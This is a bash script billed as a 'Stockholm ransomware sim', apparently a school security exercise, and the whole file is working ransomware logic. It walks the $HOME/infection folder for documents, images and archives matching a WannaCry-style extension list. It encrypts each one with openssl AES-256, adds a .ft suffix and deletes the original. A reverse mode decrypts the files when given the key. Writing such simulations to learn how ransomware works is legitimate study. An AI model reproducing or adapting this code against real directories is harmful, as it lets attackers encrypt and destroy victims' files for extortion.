#!/bin/bash
GREEN="\033[1;32m"
RED="\033[1;31m"
RESET="\033[0m"
silent=false
reverse=false
key=""
use_file_key=false
key_file="key.key"
log_file="$HOME/infection/stockholm.log"

generate_random_key() {
	# Generate 32 random bytes and base64 encode
	key=$(openssl rand -base64 32)
	echo "$key" > "$key_file"
	if [[ "$silent" != true ]]; then
		echo -e "$GREEN[+] Key saved to $key_file$RESET"
	fi
}

load_key_from_file() {
	if [[ -f "$key_file" ]]; then
		key=$(cat "$key_file")
	else
		if [[ "$silent" != true ]]; then
			echo -e "$RED[!] Key file '$key_file' not found!$RESET"
		fi
		exit 1
	fi
}

cleanup() {
	if [[ "$silent" != true ]]; then
		echo -e "$RED[!] Caught interrupt. Exiting script.$RESET" | tee -a "$log_file"
	fi
	exit 1
}

finish() {
	if [[ "$silent" != true ]]; then
		if [[ $? -eq 0 ]]; then
			echo -e "$GREEN[+] Finish encryption.$RESET"
		elif [[ $? -eq 1 ]]; then
			echo -e "$GREEN[+] Finish decryption.$RESET"
		else
			echo -e "$GREEN[X] ERROR.$RESET"
		fi
	fi
}

# Trap termination signals
trap cleanup SIGINT SIGTERM SIGHUP SIGQUIT SIGABRT
trap finish EXIT

banner() {
	echo -e "$GREEN=========================================="
	echo -e "     🧨  STOCKHOLM RANSOMWARE SIM  🧨"
	echo -e "        by $RED[KLEIN]$RESET $GREEN | v1.1"
	echo -e "==========================================$RESET"
}

wannacry_extensions=(
	"doc" "docx" "xls" "xlsx" "ppt" "pptx"
	"mdb" "accdb" "pst" "ost"
	"jpg" "jpeg" "png" "bmp" "gif"
	"txt" "csv" "log"
	"pdf"
	"zip" "rar" "7z"
)

infect() {
	local silent=$1
	local input_file=$2
	local output_file="${input_file}.ft"

	if [[ ! -r "$input_file" ]]; then
		echo -e "$RED[!] Cannot read $input_file$RESET" >> "$log_file"
		return
	fi

	if [ "$silent" = true ]; then
		openssl enc -aes-256-cbc -salt -pbkdf2 -in "$input_file" -k "$key" -out "$output_file" 2>>"$log_file"
		echo -e "$GREEN[ENCRYPTED] $input_file -> $output_file$RESET" >> "$log_file"
	else
		echo -e "$GREEN Encrypting $input_file -> $output_file $RESET"
		openssl enc -aes-256-cbc -salt -pbkdf2 -in "$input_file" -k "$key" -out "$output_file"
	fi

	rm -f "$input_file" 2>>"$log_file"
}

desinfect() {
	local silent=$1
	local input_file=$2
	local output_file="${input_file%.ft}"

	if [[ ! -r "$input_file" ]]; then
		echo -e "$RED[!] Cannot read $input_file$RESET" >> "$log_file"
		return
	fi

	if [ "$silent" = true ]; then
		openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$input_file" -k "$key" -out "$output_file" 2>>"$log_file"
		if [[ $? -ne 0 || ! -s "$output_file" ]]; then
			echo -e "$RED[!] Decryption failed: Output file is empty or error during decryption.$RESET" >> "$log_file"
			rm -f "$output_file"
			exit 2
		fi
		echo -e "$GREEN[DECRYPTED] $input_file -> $output_file$RESET" >> "$log_file"
	else
		echo -e "$GREEN Decrypting $input_file -> $output_file $RESET"
		openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$input_file" -k "$key" -out "$output_file"
		if [[ $? -ne 0 || ! -s "$output_file" ]]; then
			echo -e "$RED[!] Decryption failed: Output file is empty or error during decryption.$RESET" >> "$log_file"
			rm -f "$output_file"
			exit 2
		fi
	fi

	rm -f "$input_file" 2>>"$log_file"
}

encrypt() {
	for ext in "${wannacry_extensions[@]}"; do
		for file in *."$ext"; do
			if [[ -f "$file" ]]; then
				infect "$1" "$file"
			fi
		done
	done
}

decrypt() {
	for file in *.ft; do
		if [[ -f "$file" ]]; then
			desinfect "$1" "$file"
		fi
	done
	exit 1
}

# Check arguments
for arg in "$@"; do
	case "$arg" in
		-h|--help)
			echo "Usage: $0 [options]"
			echo "Options:"
			echo "  -h, --help        Show help message"
			echo "  -v, --version     Show version"
			echo "  -r, --reverse     Decrypt using key from key.key"
			echo "  -s, --silent      Silent mode"
			exit 0
			;;
		-v|--version)
			echo "stocholm v1.1"
			exit 0
			;;
		-r|--reverse)
			reverse=true
			use_file_key=true
			break
			;;
		-s|--silent)
			silent=true
			;;
		*)
			if [[ "$silent" != true ]]; then
				echo "Unknown option: $arg"
			fi
			exit 1
			;;
	esac
done

if [[ "$silent" != true ]]; then
	banner
fi

cd "$HOME/infection" 2>/dev/null || {
	if [[ "$silent" != true ]]; then
		echo "$HOME/infection doesn't exist"
	fi
	exit 1
}

# Load or generate key
if [[ "$reverse" == true && -n "$2" ]]; then
    key="$2"
    real_key=$(<"$key_file")
    if [[ "$key" != "$real_key" ]]; then
        if [[ "$silent" != true ]]; then
            echo -e "$RED[!] Incorrect decryption key provided. Exiting.$RESET"
        fi
        exit 2
    fi
elif [[ "$reverse" == true && -z "$2" ]]; then
    if [[ "$silent" != true ]]; then
        echo -e "$RED[!] No key provided for decryption mode. Exiting.$RESET"
    fi
    exit 2
else
    generate_random_key
fi


# Main execution
if [[ "$reverse" == true ]]; then
	decrypt "$silent"
else
	encrypt "$silent"
	mv -f "$key_file" "$HOME/infection/key.txt"
fi

exit 0

